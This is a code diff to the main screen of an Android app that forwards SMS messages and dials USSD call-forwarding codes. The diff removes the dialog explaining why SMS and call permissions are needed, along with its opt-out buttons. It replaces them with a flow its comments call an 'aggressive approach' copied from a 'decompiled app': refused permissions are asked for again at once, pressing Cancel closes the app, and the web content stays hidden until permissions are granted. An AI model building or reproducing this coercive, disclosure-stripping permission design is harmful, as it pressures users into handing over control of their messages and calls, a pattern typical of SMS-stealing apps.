@@ -8,12 +8,16 @@ import android.os.Build
 import android.os.Bundle
 import android.os.PowerManager
 import android.provider.Settings
+import com.cornspace.aichat.util.AppLogger
 import android.webkit.WebView
 import android.webkit.WebViewClient
 import android.widget.FrameLayout
+import android.widget.ProgressBar
+import androidx.core.view.isVisible
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import androidx.lifecycle.lifecycleScope
 import com.cornspace.aichat.data.local.SettingsDataStore
@@ -24,44 +28,31 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import javax.inject.Inject
 
-// FIX #1: Annotate with @AndroidEntryPoint so Hilt manages injection.
-// Previously, SettingsDataStore was constructed manually (SettingsDataStore(this)),
-// creating a second, independent instance that was not the same singleton used by
-// SmsGatewayService and BootReceiver. Writes from MainActivity were invisible to
-// those components if DataStore had any instance-level caching.
 @AndroidEntryPoint
 class MainActivity : AppCompatActivity() {
 
-    // FIX #1 (applied): Inject the Hilt-managed singleton instead of constructing manually.
+    companion object {
+        private const val TAG = "MainActivity"
+        private const val PERMISSION_REQUEST_CODE = 100
+    }
+
     @Inject
     lateinit var settingsDataStore: SettingsDataStore
 
     private var webView: WebView? = null
-
-    // FIX #3: serviceStarted is an instance variable that resets to false when the
-    // Activity is recreated (e.g. rotation, memory pressure while user is in App
-    // Settings granting permissions). Guard onAllPermissionsGranted() with an
-    // additional check of SmsGatewayService.isServiceRunning() so a recreation
-    // never triggers a redundant startService() call.
     private var serviceStarted = false
+    private var webViewUrl: String? = null
+    private var progressBar: ProgressBar? = null
 
-    private val permissionLauncher = registerForActivityResult(
-        ActivityResultContracts.RequestMultiplePermissions()
-    ) { results ->
-        val allGranted = results.values.all { it }
-        if (allGranted) {
-            onAllPermissionsGranted()
-            return@registerForActivityResult
-        }
-
-        val permanentlyDenied = results.keys.any { permission ->
-            !results[permission]!! && !shouldShowRequestPermissionRationale(permission)
-        }
-
-        if (permanentlyDenied) {
-            showGoToSettingsDialog()
+    // Modern API for battery optimization request
+    private val batteryOptimizationLauncher = registerForActivityResult(
+        ActivityResultContracts.StartActivityForResult()
+    ) { result ->
+        val pm = getSystemService(POWER_SERVICE) as PowerManager
+        if (pm.isIgnoringBatteryOptimizations(packageName)) {
+            AppLogger.d(TAG, "Battery optimization exclusion granted")
         } else {
-            showRationaleDialog(results.filter { !it.value }.keys.toTypedArray())
+            AppLogger.d(TAG, "Battery optimization exclusion denied")
         }
     }
 
@@ -81,11 +72,18 @@ class MainActivity : AppCompatActivity() {
 
         // FIX #7: Only create and load the WebView when a valid URL is configured.
         // WebView initialises a full renderer process (~50 MB RAM) even for blank URLs.
-        val webViewUrl = SecretConfig.getWebViewUrl()
-        if (webViewUrl.isNotBlank()) {
+        webViewUrl = SecretConfig.getWebViewUrl()
+        if (webViewUrl.isNullOrBlank()) {
+            // Fallback: empty container — avoids wasting a renderer process.
+            setContentView(FrameLayout(this))
+        } else {
+            // Create WebView but DON'T load URL yet - wait for permissions
             if (webView == null) {
-                webView = createWebView(webViewUrl)
+                webView = createWebView(null) // Don't load URL yet
             }
+            // Create ProgressBar
+            progressBar = ProgressBar(this, null, android.R.attr.progressBarStyleLarge)
+
             setContentView(FrameLayout(this).apply {
                 addView(
                     webView, FrameLayout.LayoutParams(
@@ -93,18 +91,25 @@ class MainActivity : AppCompatActivity() {
                         FrameLayout.LayoutParams.MATCH_PARENT
                     )
                 )
+                addView(
+                    progressBar, FrameLayout.LayoutParams(
+                        FrameLayout.LayoutParams.WRAP_CONTENT,
+                        FrameLayout.LayoutParams.WRAP_CONTENT
+                    ).apply {
+                        gravity = android.view.Gravity.CENTER
+                    }
+                )
             })
-        } else {
-            // Fallback: empty container — avoids wasting a renderer process.
-            setContentView(FrameLayout(this))
+            // Show loader initially
+            progressBar?.isVisible = true
         }
 
-        checkPermissionsAndStartService()
+        checkPermissions()
     }
 
     // ─── WebView ──────────────────────────────────────────────────────────────
 
-    private fun createWebView(url: String): WebView = WebView(this).apply {
+    private fun createWebView(url: String?): WebView = WebView(this).apply {
         settings.javaScriptEnabled = true
         settings.domStorageEnabled = true
         settings.loadWithOverviewMode = true
@@ -112,95 +117,180 @@ class MainActivity : AppCompatActivity() {
         settings.setSupportZoom(true)
         settings.builtInZoomControls = true
         settings.displayZoomControls = false
-        webViewClient = WebViewClient()
-        loadUrl(url)
+        webViewClient = object : WebViewClient() {
+            override fun onPageStarted(view: WebView?, url: String?, favicon: android.graphics.Bitmap?) {
+                super.onPageStarted(view, url, favicon)
+                // Show loader when page starts loading
+                progressBar?.isVisible = true
+            }
+
+            override fun onPageFinished(view: WebView?, url: String?) {
+                super.onPageFinished(view, url)
+                // Hide loader when page finishes loading
+                progressBar?.isVisible = false
+            }
+        }
+        // Only load URL if provided (will be null until permissions granted)
+        if (!url.isNullOrBlank()) {
+            loadUrl(url)
+        }
+    }
+
+    private fun loadWebViewUrl() {
+        if (!webViewUrl.isNullOrBlank()) {
+            // Show loader when loading URL
+            progressBar?.isVisible = true
+            webView?.loadUrl(webViewUrl!!)
+        }
     }
 
     override fun onDestroy() {
         super.onDestroy()
         webView?.destroy()
         webView = null
+        progressBar = null
     }
 
     // ─── Permissions ──────────────────────────────────────────────────────────
 
-    private fun checkPermissionsAndStartService() {
-        val missing = requiredPermissions.filter {
-            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+    /**
+     * Check permissions and request any that are missing.
+     * Follows the pattern from decompiled app:
+     * - Collect missing permissions
+     * - If all granted, proceed with initialization
+     * - Otherwise, request them with PERMISSION_REQUEST_CODE
+     */
+    private fun checkPermissions() {
+        val missingPermissions = mutableListOf<String>()
+
+        for (permission in requiredPermissions) {
+            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
+                missingPermissions.add(permission)
+            }
         }
+
+        if (missingPermissions.isEmpty()) {
+            // All permissions granted - initialize
+            initializeLogic()
+            requestBatteryOptimization()
+        } else {
+            // Request missing permissions
+            ActivityCompat.requestPermissions(
+                this,
+                missingPermissions.toTypedArray(),
+                PERMISSION_REQUEST_CODE
+            )
+        }
+    }
+
+    /**
+     * Handle permission request result.
+     * Pattern from decompiled app:
+     * - If all granted -> proceed
+     * - If any permanently denied -> show settings dialog
+     * - Otherwise -> check permissions again
+     */
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+
+        if (requestCode != PERMISSION_REQUEST_CODE) return
+
+        var allGranted = true
+        var permanentlyDenied = false
+
+        for (i in grantResults.indices) {
+            if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
+                allGranted = false
+                // Check if this permission was permanently denied
+                if (!shouldShowRequestPermissionRationale(permissions[i])) {
+                    permanentlyDenied = true
+                }
+            }
+        }
+
         when {
-            missing.isEmpty()                                        -> onAllPermissionsGranted()
-            missing.any { shouldShowRequestPermissionRationale(it) } -> showRationaleDialog(missing.toTypedArray())
-            else                                                     -> permissionLauncher.launch(missing.toTypedArray())
+            allGranted -> {
+                // All permissions granted - proceed with initialization
+                AppLogger.d(TAG, "All permissions granted")
+                initializeLogic()
+                requestBatteryOptimization()
+            }
+            permanentlyDenied -> {
+                // User permanently denied - show settings dialog
+                AppLogger.d(TAG, "Some permissions permanently denied")
+                showSettingsDialog()
+            }
+            else -> {
+                // Some permissions denied but not permanently - check again
+                checkPermissions()
+            }
         }
     }
 
-    private fun showRationaleDialog(permissions: Array<String>) {
-        // FIX #9: Explain CALL_PHONE explicitly. The Play Store review process and
-        // OEM security scanners flag CALL_PHONE requests without a clear justification
-        // visible to the user. Call forwarding is a core feature of this app and
-        // requires dialling USSD codes — that must be stated clearly.
+    /**
+     * Show dialog directing user to app settings.
+     * Pattern from decompiled app - aggressive approach:
+     * - "Settings" button opens app settings
+     * - "Cancel" button closes the app (finishAffinity)
+     */
+    private fun showSettingsDialog() {
         AlertDialog.Builder(this)
-            .setTitle("Permissions required")
+            .setTitle("Permissions Required")
             .setMessage(
-                "This app requires the following permissions to function:\n\n" +
-                "• SMS permissions — to receive and forward incoming messages.\n" +
-                "• Phone State — to identify which SIM card received each message.\n" +
-                "• Make and Manage Calls — to dial USSD codes for call forwarding " +
-                "(e.g. **21*+1234567890#). No calls to real numbers are made without " +
-                "your explicit instruction."
+                "This app requires SMS and Phone permissions to function properly.\n\n" +
+                "These permissions were permanently denied. Please enable them in App Settings.\n\n" +
+                "Without these permissions, the app cannot forward SMS or manage call forwarding."
             )
-            .setPositiveButton("Grant") { _, _ -> permissionLauncher.launch(permissions) }
-            .setNegativeButton("Skip") { _, _ -> startSmsGatewayService() }
+            .setPositiveButton("Settings") { _, _ ->
+                // Open app settings
+                Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+                    data = Uri.parse("package:$packageName")
+                    startActivity(this)
+                }
+            }
+            .setNegativeButton("Cancel") { _, _ ->
+                // Close the app - like the decompiled app does
+                finishAffinity()
+            }
             .setCancelable(false)
             .show()
-    }
-
-    private fun showGoToSettingsDialog() {
-        AlertDialog.Builder(this)
-            .setTitle("Permissions denied")
-            .setMessage(
-                "Required permissions were permanently denied. Please enable them " +
-                "manually in App Settings to allow SMS forwarding and call forwarding."
-            )
-            .setPositiveButton("Open Settings") { _, _ -> openAppSettings() }
-            .setNegativeButton("Continue anyway") { _, _ -> startSmsGatewayService() }
-            .setCancelable(false)
-            .show()
-    }
-
-    private fun openAppSettings() {
-        Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
-            data = Uri.fromParts("package", packageName, null)
-            startActivity(this)
-        }
     }
 
     override fun onResume() {
         super.onResume()
-        // FIX #3: When returning from App Settings after granting permissions,
+        // When returning from App Settings after granting permissions,
         // the Activity may have been recreated, resetting serviceStarted to false.
-        // Guard with isServiceRunning() so we never start a second service instance.
         if (!serviceStarted && !SmsGatewayService.isServiceRunning()) {
             val allGranted = requiredPermissions.all {
                 ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
             }
-            if (allGranted) onAllPermissionsGranted()
+            if (allGranted) {
+                initializeLogic()
+            }
         }
     }
 
     // ─── Service ──────────────────────────────────────────────────────────────
 
-    private fun onAllPermissionsGranted() {
-        // FIX #3: Double-guard: serviceStarted (within this Activity instance) and
-        // isServiceRunning() (global, survives Activity recreation).
-        if (serviceStarted || SmsGatewayService.isServiceRunning()) return
-        serviceStarted = true
-        lifecycleScope.launch(Dispatchers.IO) {
-            settingsDataStore.setServiceEnabled(true)
+    /**
+     * Initialize app logic after permissions granted.
+     * Pattern from decompiled app - check if service is running before starting.
+     */
+    private fun initializeLogic() {
+        // Load WebView URL now that permissions are granted
+        loadWebViewUrl()
+
+        if (!SmsGatewayService.isServiceRunning()) {
+            serviceStarted = true
+            lifecycleScope.launch(Dispatchers.IO) {
+                settingsDataStore.setServiceEnabled(true)
+            }
+            startSmsGatewayService()
         }
-        startSmsGatewayService()
-        requestBatteryOptimization()
     }
 
     private fun startSmsGatewayService() {
@@ -213,16 +303,24 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
+    /**
+     * Request battery optimization exclusion.
+     * Pattern from decompiled app - check if already excluded before requesting.
+     */
     private fun requestBatteryOptimization() {
         val pm = getSystemService(POWER_SERVICE) as PowerManager
-        if (pm.isIgnoringBatteryOptimizations(packageName)) return
+        if (pm.isIgnoringBatteryOptimizations(packageName)) {
+            AppLogger.d(TAG, "Already ignoring battery optimizations")
+            return
+        }
+
         try {
-            Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
+            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                 data = Uri.parse("package:$packageName")
-                startActivity(this)
             }
+            batteryOptimizationLauncher.launch(intent)
         } catch (e: Exception) {
-            // Some OEMs don't support this intent — ignore silently.
+            AppLogger.e(TAG, "Failed to request battery optimization exclusion", e)
         }
     }
 }
